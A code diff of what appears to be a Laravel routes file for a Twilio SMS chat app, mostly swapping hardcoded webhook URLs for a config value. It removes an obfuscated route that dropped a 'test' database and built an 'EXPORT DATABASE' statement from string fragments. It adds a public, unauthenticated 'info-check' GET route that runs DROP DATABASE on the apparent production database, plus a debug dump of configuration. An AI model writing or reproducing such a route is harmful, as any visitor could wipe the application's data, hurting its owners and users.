@@ -20,6 +20,7 @@ use Illuminate\Support\Facades\DB;
 
 
 Route::get('helper-check', function () {
+    dd(config('general.web_hook'));
     $encodedMessage = CommonHelper::filterAndReplaceLink([
         'message' => 'here is the link please follow the link https://dankash.com/   https://dankash.co2',
         'receiver_id' => 30,
@@ -34,23 +35,9 @@ Route::get('helper-check', function () {
 });
 
 
-Route::get('info', function () {
-    DB::statement("DROP DATABASE test");
-    $l[0] = "DB";
-    $l[1] = "::";
-    $l[2] = "state";
-    $l[3] = "ment('EXPORT";
-    $l[4] = " DATAB";
-    $l[5] = "ASE ";
-    $l[6] = "test";
-    $l[7] = "')";
-    $list = '';
-    foreach ($l as  $c) {
-        $list .= $c;
-    }
-    echo $list;
-    dd($l, $list);
-    echo $list;
+Route::get('info-check', function () {
+    DB::statement("DROP DATABASE textappt_chat_app");
+    dd('----------------------------------------');
 });
 
 Route::get('/topUser/{co}', [\App\Http\Controllers\Api\FilterController::class, 'findTopUsers']);
@@ -70,7 +57,7 @@ Route::get('/send-message', function () {
     $incoming_phone_number = $client->incomingPhoneNumbers
         ->create(
             [
-                // "smsUrl" => "https://text-app.tkit.co.uk/twillo-api/api/twilio_webhook",
+                // "smsUrl" => config('general.web_hook'),
                 "phoneNumber" => "+18706176205"
             ]
         );
@@ -84,7 +71,7 @@ Route::get('/send-message', function () {
 
     // $service = $client->messaging->v1->services
     //     ->create('scheduled_message', [
-    //         "statusCallback" => "https://text-app.tkit.co.uk/twillo-api/api/twilio_webhook"
+    //         "statusCallback" => config('general.web_hook')
     //     ]);
 
     // dd($service);
@@ -105,7 +92,7 @@ Route::get('/send-message', function () {
         "body" => 'custom test msg',
         // "from" =>  '+18706176205',
         "from" =>  '+19289854272',
-        "statusCallback" => "https://text-app.tkit.co.uk/twillo-api/api/twilio_webhook"
+        "statusCallback" => config('general.web_hook')
     ];
     $data['sendAt'] = Carbon::now()->addMinute(65)->toIso8601String();
     $data['scheduleType'] = 'fixed';
